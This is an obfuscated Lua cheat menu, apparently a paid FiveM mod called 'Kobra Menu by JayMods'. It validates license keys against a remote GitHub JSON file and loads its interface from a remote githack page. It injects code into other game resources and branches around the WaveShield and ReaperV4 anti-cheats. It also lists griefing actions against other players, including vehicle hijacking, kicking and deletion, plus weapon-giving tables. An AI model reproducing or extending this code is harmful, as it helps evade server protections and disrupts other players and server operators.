MachoLockLogger(1 + 0 );local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v118,v119) local v120=0;local v121;while true do if (v120==(1687 -(1391 + 295))) then if DEBUG then local v735=0 -0 ;local v736;while true do if (v735==(1 + 0)) then print("[KOBRA Safety] Decoded secret: "   .. table.concat(v736,",") );break;end if (v735==(0 -0)) then v736={};for v1013=820 -(599 + 220) , #v121 do v736[v1013]=string.byte(v121,v1013);end v735=1;end end end return v121;end if (v120==(0 -0)) then v121="";for v657=1, #v118 do local v658=1931 -(1813 + 118) ;local v659;while true do if (v658==(0 + 0)) then v659=string.byte(v118,v657);v121=v121   .. string.char((v659-v119)%(1473 -(841 + 376)) ) ;break;end end end v120=1;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v122=0;local v123;while true do if (v122==0) then v123=GetCloudTimeAsInt();return ((v123>(0 -0)) and v123) or (0 + 0) ;end end end local function v7(v124) local v125=0;local v126;local v127;local v128;local v129;local v130;local v131;local v132;while true do if (v125==(5 -3)) then return (v132 * 86400) + (tonumber(v129) * 3600) + (tonumber(v130) * (919 -(464 + 395))) + tonumber(v131) ;end if (v125==1) then if  not v126 then return nil;end v132=((tonumber(v126) -(5055 -3085)) * (176 + 189)) + math.floor((tonumber(v126) -1969)/(841 -(467 + 370)) ) + ((tonumber(v127) -(1 -0)) * (23 + 7)) + tonumber(v128) ;v125=6 -4 ;end if (v125==0) then if (type(v124)~="string") then return nil;end v126,v127,v128,v129,v130,v131=string.match(v124,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v125=1 + 0 ;end end end local function v8() local v133=0 -0 ;local v134;local v135;local v136;while true do if (v133==(522 -(150 + 370))) then for v660,v661 in ipairs(v135) do if ((type(v661)=="table") and (v661.key==v4)) then if (v661.expires and (type(v661.expires)=="string")) then local v947=1282 -(74 + 1208) ;local v948;while true do if (v947==(0 -0)) then v948=v7(v661.expires);if  not v948 then return false,"Bad expiry format";end v947=4 -3 ;end if (v947==1) then if (v948>v136) then return true,"Key valid (not expired)",v948;else return false,"Key expired",v948;end break;end end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end if (v133==(1 + 0)) then if ( not v134 or  not v135 or (type(v135)~="table")) then return false,"Key list invalid";end v136=v6();v133=392 -(14 + 376) ;end if (v133==(0 -0)) then if  not v3 then return false,"No key list available";end v134,v135=pcall(json.decode,v3);v133=1;end end end local v9,v10,v11=v8();if  not v9 then local v327=0 + 0 ;while true do if (v327==(0 + 0)) then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,10);return;end end end Citizen.CreateThread(function() if (v11 and (v11>0)) then local v508=0;local v509;local v510;while true do if (v508==0) then v509=v6();v510=v11-v509 ;v508=1;end if (v508==1) then if (v510>(0 + 0)) then local v882=0 -0 ;local v883;local v884;local v885;while true do if (v882==(0 + 0)) then v883=math.floor(v510/86400 );v884=math.floor((v510%(86478 -(23 + 55)))/(8531 -4931) );v882=1 + 0 ;end if (v882==1) then v885=string.format("Your key is valid. Expires in %d days and %d hours.",v883,v884);MachoMenuNotification("KOBRA",v885,5 + 0 );break;end end else MachoMenuNotification("KOBRA","Key expired.",15 -5 );end break;end end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",2 + 3 );end end);local v12={};local v13=false;local v14=nil;local v15=902 -(652 + 249) ;local v16={};local v17=v16;local v18=nil;local v19=2 -1 ;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=1;local v35=1869 -(708 + 1160) ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1391 -(360 + 1030) ;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[24 + 3 ]="Escape",[315 -203 ]="F1",[154 -41 ]="F2",[1775 -(909 + 752) ]="F3",[1338 -(109 + 1114) ]="F4",[116]="F5",[213 -96 ]="F6",[46 + 72 ]="F7",[119]="F8",[120]="F9",[363 -(6 + 236) ]="F10",[122]="F11",[78 + 45 ]="F12",[155 + 37 ]="`",[49]="1",[117 -67 ]="2",[88 -37 ]="3",[52]="4",[1186 -(1076 + 57) ]="5",[9 + 45 ]="6",[744 -(579 + 110) ]="7",[5 + 51 ]="8",[51 + 6 ]="9",[48]="0",[189]="-",[100 + 87 ]="=",[415 -(174 + 233) ]="Backspace",[9]="Tab",[226 -145 ]="Q",[87]="W",[120 -51 ]="E",[37 + 45 ]="R",[84]="T",[1263 -(663 + 511) ]="Y",[76 + 9 ]="U",[73]="I",[18 + 61 ]="O",[246 -166 ]="P",[133 + 86 ]="[",[520 -299 ]="]",[532 -312 ]="\\",[20]="CapsLock",[32 + 33 ]="A",[161 -78 ]="S",[49 + 19 ]="D",[70]="F",[71]="G",[72]="H",[7 + 67 ]="J",[797 -(478 + 244) ]="K",[593 -(440 + 77) ]="L",[85 + 101 ]=";",[812 -590 ]="'",[1569 -(655 + 901) ]="Enter",[3 + 13 ]="Shift",[69 + 21 ]="Z",[88]="X",[67]="C",[59 + 27 ]="V",[66]="B",[78]="N",[77]="M",[188]=",",[765 -575 ]=".",[1636 -(695 + 750) ]="/",[58 -41 ]="Control",[46]="Delete",[33]="PageUp",[52 -18 ]="PageDown",[35]="End",[144 -108 ]="Home",[389 -(285 + 66) ]="ArrowUp",[93 -53 ]="ArrowDown",[1347 -(682 + 628) ]="ArrowLeft",[7 + 32 ]="ArrowRight"};local v45={[27]=322,[411 -(176 + 123) ]=121 + 167 ,[113]=210 + 79 ,[114]=439 -(239 + 30) ,[32 + 83 ]=161 + 6 ,[116]=293 -127 ,[364 -247 ]=482 -(306 + 9) ,[411 -293 ]=30 + 138 ,[74 + 45 ]=82 + 87 ,[120]=159 -103 ,[1496 -(1140 + 235) ]=57,[122]=219 + 125 ,[123]=317 + 28 ,[50 + 142 ]=295 -(33 + 19) ,[18 + 31 ]=157,[50]=473 -315 ,[23 + 28 ]=160,[101 -49 ]=154 + 10 ,[742 -(586 + 103) ]=16 + 149 ,[166 -112 ]=1647 -(1309 + 179) ,[99 -44 ]=71 + 90 ,[56]=162,[57]=163,[128 -80 ]=82,[189]=84,[142 + 45 ]=175 -92 ,[15 -7 ]=786 -(295 + 314) ,[9]=90 -53 ,[2043 -(1300 + 662) ]=44,[273 -186 ]=1787 -(1178 + 577) ,[36 + 33 ]=46,[242 -160 ]=1450 -(851 + 554) ,[75 + 9 ]=679 -434 ,[192 -103 ]=548 -(115 + 187) ,[66 + 19 ]=303,[73]=71 + 3 ,[79]=783 -584 ,[1241 -(160 + 1001) ]=7,[192 + 27 ]=27 + 12 ,[452 -231 ]=40,[578 -(237 + 121) ]=933 -(525 + 372) ,[37 -17 ]=449 -312 ,[65]=176 -(96 + 46) ,[860 -(643 + 134) ]=12 + 21 ,[68]=30,[167 -97 ]=49,[71]=174 -127 ,[72]=71 + 3 ,[74]=610 -299 ,[153 -78 ]=1030 -(316 + 403) ,[76]=5 + 2 ,[186]=222 -141 ,[81 + 141 ]=206 -124 ,[13]=13 + 5 ,[6 + 10 ]=72 -51 ,[90]=20,[420 -332 ]=151 -78 ,[4 + 63 ]=51 -25 ,[86]=0 + 0 ,[66]=85 -56 ,[78]=266 -(12 + 5) ,[298 -221 ]=520 -276 ,[399 -211 ]=202 -120 ,[39 + 151 ]=81,[2164 -(1656 + 317) ]=74 + 9 ,[14 + 3 ]=95 -59 ,[226 -180 ]=532 -(5 + 349) ,[33]=47 -37 ,[1305 -(266 + 1005) ]=11,[24 + 11 ]=726 -513 ,[47 -11 ]=213,[38]=1723 -(561 + 1135) ,[40]=173,[48 -11 ]=571 -397 ,[1105 -(507 + 559) ]=439 -264 };local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v137) MachoInjectResource("any",v137);end v12.Debug=function(v138,v139,v140) local v141=0;local v142;local v143;while true do if ((0 -0)==v141) then v142={red="^1",yellow="^3",green="^2",info="^5"};v143=v142[v139] or "^5" ;v141=389 -(212 + 176) ;end if (v141==(906 -(250 + 655))) then print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v143,v140));break;end end end;v12.SendMessage=function(v144,v145) if (v14 and v145) then MachoSendDuiMessage(v14,json.encode(v145));end end;v12.Notify=function(v146,v147,v148,v149,v150) v146:SendMessage({action="showNotification",type=v147,title=v148,desc=v149,duration=v150});end;v12.GetMenuPath=function(v151) local v152=0;local v153;while true do if (v152==0) then v153={"Kobra Menu by JayMods"};for v662=1 -0 , #v21 do table.insert(v153,v21[v662]);end v152=1 -0 ;end if (1==v152) then return v153;end end end;v12.UpdateElements=function(v154,v155) local v156=1956 -(1869 + 87) ;local v157;while true do if (v156==1) then if (v18 and (type(v18)=="table") and ( #v18>(0 -0))) then local v737=1901 -(484 + 1417) ;while true do if (v737==(0 -0)) then v157.categories=v18;v157.categoryIndex=(v19 or 1) -(1 -0) ;break;end end end v154:SendMessage(v157);break;end if (v156==(773 -(48 + 725))) then if ( not v155 or (type(v155)~="table")) then return;end v157={action="updateElements",elements=v155,index=v15-(1 -0) ,path=v154:GetMenuPath()};v156=2 -1 ;end end end;v12.Initialize=function(v158) local v159=0 + 0 ;local v160;while true do if (v159==0) then v160="https://rawcdn.githack.com/WM5M/sdkhbvfsdhjkvbdbcfjgasvdhjve64654656843242hjg4g43kg4aguk534/refs/heads/main/kold4.html";v14=MachoCreateDui(v160);v159=2 -1 ;end if (v159==(1 + 0)) then if v14 then local v738=0 + 0 ;while true do if (v738==(853 -(152 + 701))) then v158:Debug("yellow","Creating & Initializing Kobra DUI...");MachoShowDui(v14);v738=1;end if (v738==(1312 -(430 + 881))) then v158:Debug("green","Kobra UI loaded successfully!");break;end end else v158:Debug("red","Failed to load Kobra UI!");end break;end end end;v12.HideUI=function(v161,v162) local v163=0 + 0 ;while true do if (v163==0) then if v162 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v163=896 -(557 + 338) ;end if (v163==(1 + 0)) then v12:SendMessage({action="showUI",visible=false});break;end end end;v12.SendMessage=function(v164,v165) local v166=0 -0 ;while true do if (v166==(0 -0)) then if ( not v14 or  not v165 or (type(v165)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v165));break;end end end;v12.ShowUI=function(v167) local v168=0 -0 ;local v169;while true do if (v168==(2 -1)) then if (v18 and ( #v18>(801 -(499 + 302)))) then local v739=866 -(39 + 827) ;while true do if (v739==(0 -0)) then v169.categories=v18;v169.categoryIndex=v19-(2 -1) ;break;end end end v167:SendMessage(v169);break;end if (v168==(0 -0)) then v13=true;v169={action="showUI",visible=true,elements=v17,index=v15-(1 -0) ,path=v167:GetMenuPath(),username=Username or "KobraBypass" ,header="JayMods",theme="kobra-red-black"};v168=1 + 0 ;end end end;v12.UpdateElements=function(v170,v171) local v172=0;local v173;while true do if (v172==(2 -1)) then if (v18 and ( #v18>(0 + 0))) then local v740=0;while true do if (v740==(0 -0)) then v173.categories=v18;v173.categoryIndex=(v19 or 1) -(105 -(103 + 1)) ;break;end end end v170:SendMessage(v173);break;end if (v172==(554 -(475 + 79))) then if ( not v171 or (type(v171)~="table")) then return;end v173={action="updateElements",elements=v171,index=v15-1 ,path=v170:GetMenuPath(),header="JayMods"};v172=2 -1 ;end end end;v26=false;MachoOnKeyDown(function(v174) local v175=0 -0 ;while true do if (v175==(1 + 0)) then if (v174==(34 + 4)) then local v741=1503 -(1395 + 108) ;while true do if (v741==(0 -0)) then v12:SendMessage({action="keydown",key="ArrowUp"});return;end end end if (v174==(1244 -(7 + 1197))) then local v742=0;while true do if (v742==(0 + 0)) then v12:SendMessage({action="keydown",key="ArrowDown"});return;end end end v175=2;end if ((0 + 0)==v175) then if ((v174==(335 -(27 + 292))) or (v174==160) or (v174==(471 -310))) then v26=true;end if  not v13 then return;end v175=1;end if ((2 -0)==v175) then if (v174==(54 -41)) then local v743=0;while true do if (v743==0) then v12:SendMessage({action="keydown",key="Enter"});return;end end end break;end end end);MachoOnKeyUp(function(v176) if ((v176==16) or (v176==(315 -155)) or (v176==161)) then v26=false;end end);local v58=nil;local function v59(v177,v178,v179,v180) local v181=0 -0 ;while true do if (v181==(139 -(43 + 96))) then if v58 then return;end v58={title=v177,buffer=v178 or "" ,maxLength=130 -98 ,onConfirm=v179,type=v180 or "typeable" ,closeable=((v180=="keybind") and false) or true ,active=true};v181=1;end if (v181==(1 -0)) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v177,value=v58.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v181=2;end if ((3 + 0)==v181) then v24=false;break;end if (2==v181) then Wait(71 + 179 );v12:HideUI(true);v181=5 -2 ;end end end MachoOnKeyDown(function(v182) if ( not v58 or  not v58.active) then return;end if (v182==13) then local v511=0;while true do if (1==v511) then if v58.onConfirm then v58.onConfirm(v58.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v511=1 + 1 ;end if (v511==(5 -2)) then return;end if (v511==0) then v58.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v511=1;end if (v511==(1 + 1)) then v58=nil;v24=true;v511=1 + 2 ;end end elseif (v182==8) then if (v58.type=="typeable") then v58.buffer=v58.buffer:sub(1, -(1753 -(1414 + 337)));else v58.buffer="";end elseif (v182==(1967 -(1642 + 298))) then local v842=0;while true do if (v842==3) then return;end if (v842==(4 -2)) then v58=nil;v24=true;v842=8 -5 ;end if (1==v842) then v58.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v842=2;end if (v842==(0 -0)) then if  not v58.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v842=1 + 0 ;end end elseif (v58.type=="keybind") then local v955=0;local v956;while true do if (v955==0) then v956=v44[v182];if v956 then if (v58.buffer~=v956) then v58.buffer=v956;end end break;end end elseif (v58.type=="typeable") then local v1042=0;local v1043;local v1044;while true do if (v1042==0) then v1043={[38 + 10 ]="0",[49]="1",[1022 -(357 + 615) ]="2",[36 + 15 ]="3",[127 -75 ]="4",[46 + 7 ]="5",[115 -61 ]="6",[55]="7",[56]="8",[46 + 11 ]="9",[65]="A",[5 + 61 ]="B",[67]="C",[43 + 25 ]="D",[1370 -(384 + 917) ]="E",[767 -(128 + 569) ]="F",[71]="G",[1615 -(1407 + 136) ]="H",[73]="I",[74]="J",[1962 -(687 + 1200) ]="K",[1786 -(556 + 1154) ]="L",[77]="M",[274 -196 ]="N",[79]="O",[175 -(9 + 86) ]="P",[81]="Q",[503 -(275 + 146) ]="R",[14 + 69 ]="S",[148 -(29 + 35) ]="T",[376 -291 ]="U",[86]="V",[259 -172 ]="W",[388 -300 ]="X",[58 + 31 ]="Y",[1102 -(53 + 959) ]="Z",[189]="-",[595 -(312 + 96) ]="=",[188]=",",[190]=".",[322 -136 ]=";",[507 -(147 + 138) ]="'",[1090 -(813 + 86) ]="/",[174 + 18 ]="`",[32]=" "};v1044=v1043[v182];v1042=1 -0 ;end if (v1042==1) then if (v1044 and ( #v58.buffer<v58.maxLength)) then local v1393=0;while true do if (v1393==(492 -(18 + 474))) then if v12:IsShiftHeld() then if v1044:match("%a") then v1044=v1044:upper();elseif (v1044=="-") then v1044="_";end elseif v1044:match("%a") then v1044=v1044:lower();end v58.buffer=v58.buffer   .. v1044 ;break;end end end break;end end end if v58 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v58.title,value=v58.buffer}));end end);CreateThread(function() while true do local v328=0 + 0 ;while true do if (v328==(0 -0)) then Wait(1086 -(860 + 226) );if (v58~=nil) then local v843=303 -(121 + 182) ;while true do if (v843==1) then for v1045=0 + 0 ,357 do if ((v1045<(1288 -(988 + 252))) or (v1045>(11 + 79))) then DisableControlAction(0,v1045,true);end end break;end if (v843==0) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
